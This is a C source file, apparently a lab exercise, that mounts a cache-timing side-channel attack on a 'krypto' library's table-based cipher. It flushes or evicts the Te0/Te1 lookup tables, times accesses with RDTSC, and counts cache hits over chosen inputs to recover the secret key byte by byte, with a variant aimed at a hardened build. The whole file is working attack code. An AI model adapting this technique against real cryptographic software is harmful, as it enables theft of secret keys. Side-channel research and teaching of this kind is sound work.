#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <x86intrin.h>

#include "krypto.h"
#include <sys/mman.h>
#include <time.h>

#define array_size(x) (sizeof(x) / sizeof(*(x)))

#ifdef HARDENED
extern uint64_t Te0[];
extern uint64_t Te1[];
#else
extern uint64_t Te0[];
#endif

#define ROUNDS 50
#define SUPERPAGE (1 << 30)

#define NB_THRESHOLD_ROUNDS (1 << 13)

#define POOL_SIZE 120
#define PAGE_SIZE_KB ((4) * (1 << 10))
char *pool[POOL_SIZE] = {0};
//uint64_t volatile *pool_pages[16][4] = {0};

static inline int compare(const void *t1, const void *t2) { return (int)(*(uint64_t *)t1 - *(uint64_t *)t2); }

static inline uint64_t median(uint64_t times[], const size_t size) {
	qsort(times, size, sizeof(uint64_t), compare);
	uint16_t n = ((size + 1) / 2) - 1;
	return times[n];
}

static inline uint64_t time_access(const volatile uint64_t *addr1) {
	uint64_t t0, t1;
	uint32_t cycles_high, cycles_high1, cycles_low, cycles_low1;

	uint16_t r = ROUNDS;

	static uint64_t times[ROUNDS] = {0};

	//while (--r) {

	asm volatile("mfence\n\t");
	asm volatile("CPUID\n\t"
	             "RDTSC\n\t"
	             "mov %%edx, %0\n\t"
	             "mov %%eax, %1\n\t"
	             : "=r"(cycles_high), "=r"(cycles_low)::"%rax", "%rbx", "%rcx", "%rdx");

	asm volatile("mfence\n\t");

	*addr1;

	asm volatile("mfence\n\t");
	asm volatile("RDTSCP\n\t"
	             "mov %%edx, %0\n\t"
	             "mov %%eax, %1\n\t"
	             "CPUID\n\t"
	             : "=r"(cycles_high1), "=r"(cycles_low1)::"%rax", "%rbx", "%rcx",
	               "%rdx");

	t0 = (((uint64_t)cycles_high << 32) | (uint64_t)cycles_low);
	t1 = (((uint64_t)cycles_high1 << 32) | (uint64_t)cycles_low1);

	// times[0] will never have a value
	return t1 - t0;
	//return median(times, ROUNDS);
}

void build_eviction_sets() {

	uint32_t nbEvictedAddr      = 0,
	         nbEvictionSetFound = 0;
	//totalPoolSize      = 100;

	//1. allocate a large pool of pages
	for (uint32_t i = 0; i < POOL_SIZE; i++) {
		pool[i] = mmap(NULL, PAGE_SIZE_KB, PROT_READ | PROT_WRITE,
		               MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	}

	/* while (nbEvictionSetFound < 16) {

		nbEvictedAddr = 0;
		//2.pick a page P from the pool
		uint32_t ind            = rand() % totalPoolSize;
		uint64_t volatile *page = pool[ind];
		while (!page) {
			ind  = (++ind) % totalPoolSize;
			page = pool[ind];
		}

		//2.5, check that the previous eviction sets do not evict this one
		//6. try this again with a page that the eviction set for P does not evict
		*page;
		asm volatile("mfence\n\t");
		for (size_t i = 0; i < nbEvictionSetFound; i++) {
			for (size_t j = 0; j < 4; j++)
				if (pool_pages[nbEvictionSetFound][j]) {
					*pool_pages[nbEvictionSetFound][j];
					asm volatile("mfence\n\t");
				}
		}
		asm volatile("mfence\n\t");
		while (time_access(page) > 120) {
			ind  = rand() % totalPoolSize;
			page = pool[ind];
			while (!page) {
				ind  = (++ind) % totalPoolSize;
				page = pool[ind];
			}
			*page;
			asm volatile("mfence\n\t");
			for (size_t i = 0; i < nbEvictionSetFound; i++) {
				for (size_t j = 0; j < 4; j++)
					if (pool_pages[nbEvictionSetFound][j]) {
						*pool_pages[nbEvictionSetFound][j];
						asm volatile("mfence\n\t");
					}
			}
		}

		//3. check that accessing the first cacheline of all the other pages evicts the first cacheline of p.
		*page;
		asm volatile("mfence\n\t");
		for (size_t i = 0; i < totalPoolSize; i++)
			if (pool[i] && pool[i] != page) {
				*pool[i];
				asm volatile("mfence\n\t");
			}
		//if it didnt evict p, add a new page and repeat until it evicts p
		while (time_access(page) < 120 || totalPoolSize < 5000) {
			pool[totalPoolSize] = (uint64_t *)mmap(NULL, PAGE_SIZE_KB, PROT_READ | PROT_WRITE,
			                                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
			totalPoolSize++;
			*page;
			asm volatile("mfence\n\t");
			for (size_t i = 0; i < totalPoolSize; i++)
				if (pool[i] && pool[i] != page) {
					*pool[i];
					asm volatile("mfence\n\t");
				}
			asm volatile("mfence\n\t");
		}

		printf("totalPoolsize: %d", totalPoolSize);
		uint64_t volatile *temp_pool[POOL_SIZE];
		memcpy(temp_pool, pool, totalPoolSize * sizeof(uint64_t *));

		//5.keep removing until the pool has exactly 4 members, this will be an eviction set for P
		while (nbEvictedAddr < totalPoolSize - 4) {
			//4.pick a page Q from the pool and remove it
			uint32_t r              = rand() % totalPoolSize;
			uint64_t volatile *temp = temp_pool[r];

			while (!temp) {
				r    = (++r) % totalPoolSize;
				temp = temp_pool[r];
			}

			temp_pool[r] = 0;

			//does the (pool - Q) still evicts P?
			*page;
			asm volatile("mfence\n\t");
			for (size_t i = 0; i < totalPoolSize; i++)
				if (temp_pool[i] && temp_pool[i] != page) {
					*temp_pool[i];
					asm volatile("mfence\n\t");
				}
			asm volatile("mfence\n\t");
			if (time_access(page) > 120) {
				//pool - Q still evicts P, we can remove Q from the pool (leave it NULL)
				//	printf("totalPoolSize %d, removing Q: %d,\n", totalPoolSize, nbEvictedAddr);
				fflush(stdout);
				nbEvictedAddr++;
			} else {
				temp_pool[r] = temp; //otherwise leave it
			}
		}
		for (size_t i = 0, j = 0; j < totalPoolSize && i < 4; j++) {
			if (temp_pool[j]) {
				pool_pages[nbEvictionSetFound][i++] = temp_pool[j];
			}
		}
		printf("new eviction Set!\n");
		fflush(stdout);

		nbEvictionSetFound++;
	} */
}

int main(void) {

	time_t t;

	srand((unsigned)time(&t));
	unsigned char out[8];
	unsigned char in[8];

	uint64_t results[256] = {0};

	uint64_t thresholdValues[NB_THRESHOLD_ROUNDS], thresholdValue = 0;

	uint64_t thresholdComputed = 0;

#ifdef EVICT
	build_eviction_sets();
#endif

	printf("0x");

	for (size_t i = 0; i < 8; i++) {
		for (size_t j = 0; j < 256; j++) {
			results[j] = 0;
		}

		//only used the first round for threshold computation
		for (size_t val = 0; val < 256 && !thresholdComputed; val++) {
			in[i] = val;
			for (size_t round = 0; round < (1 << 13); round++) {
				for (size_t j; j < 8; j++) {
					if (i == j) continue;
					in[j] = rand() % 256;
				}

#ifdef EVICT
				asm volatile("mfence\n\t");
				for (size_t i = 0; i < POOL_SIZE; i++)
					if (pool[i]) {
						char u = 1 + *pool[i];
					}
				asm volatile("mfence\n\t");
#else
				asm volatile("clflushopt (%0)\n\t" ::"r"(Te0)
				             : "memory");
#endif

				krypto_sign_data(out, in, 8);
				thresholdValues[round] = time_access(Te0);
			}

			if (!thresholdComputed) {
				qsort(thresholdValues, NB_THRESHOLD_ROUNDS, sizeof(uint64_t), compare);

#ifdef EVICT
				thresholdValue = (thresholdValues[NB_THRESHOLD_ROUNDS - 10] - thresholdValues[10]) / 2 + thresholdValues[10];
#else
				thresholdValue = (thresholdValues[NB_THRESHOLD_ROUNDS - 20] - thresholdValues[20]) / 2;
#endif
				thresholdComputed = 1;
			}
		}

		for (size_t val = 0; val < 256; val++) {
			in[i] = val;

			for (size_t round = 0; round < (1 << 13); round++) {
				for (size_t j; j < 8; j++) {
					if (i == j) continue;
					in[j] = rand() % 256;
				}
#ifdef HARDENED
				asm volatile("clflushopt (%0)\n\t" ::"r"(Te0)
				             : "memory");
#else
#ifdef EVICT
				asm volatile("mfence\n\t");
				for (size_t i = 0; i < POOL_SIZE; i++)
					if (pool[i]) {
						char u = 1 + *pool[i];
					}
				asm volatile("mfence\n\t");
#else
				asm volatile("clflushopt (%0)\n\t" ::"r"(Te0)
				             : "memory");
#endif
#endif
				krypto_sign_data(out, in, 8);

				if (time_access(Te0) < thresholdValue)
					results[val]++;
			}
		}

		uint8_t max = 0;
		for (size_t j = 0; j < 256; j++) {
			if (results[j] > results[max])
				max = j;
		}

#ifdef HARDENED

		printf("%x", max >> 4);

		for (size_t j = 0; j < 256; j++) {
			results[j] = 0;
		}

		for (size_t val = 0; val < 256; val++) {
			in[i] = val;

			for (size_t round = 0; round < (1 << 13); round++) {
				for (size_t j; j < 8; j++) {
					if (i == j) continue;
					in[j] = rand() % 256;
				}

				asm volatile("clflushopt (%0)\n\t" ::"r"(Te1)
				             : "memory");

				krypto_sign_data(out, in, 8);

				if (time_access(Te1) < thresholdValue)
					results[val]++;
			}
		}

		max = 0;
		for (size_t j = 0; j < 256; j++) {
			if (results[j] > results[max])
				max = j;
		}
		printf("%x", max >> 4);
#else
		printf("%x", max);
#endif

		fflush(stdout);
	}
	printf("\n");
	fflush(stdout);

	return 0;
}